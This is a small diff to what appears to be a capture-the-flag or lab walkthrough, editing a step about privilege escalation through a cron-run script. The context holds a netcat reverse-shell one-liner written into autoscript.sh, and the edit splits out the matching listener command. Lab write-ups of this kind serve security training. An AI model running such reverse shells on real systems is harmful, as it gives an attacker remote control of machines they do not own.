@@ -83,7 +83,8 @@ password = password
 - echo "mkfifo /tmp/qjqlxog; nc 10.10.0.0 8888 0</tmp/qjqlxog | /bin/sh >/tmp/qjqlxog 2>&1; rm /tmp/qjqlxog" > autoscript.sh
 
 
-### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!
+### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using:
+- nc -lnvp 8888
 ![1](https://user-images.githubusercontent.com/69840849/90490101-895fa900-e181-11ea-8166-ca5a4a637815.png)
 
 
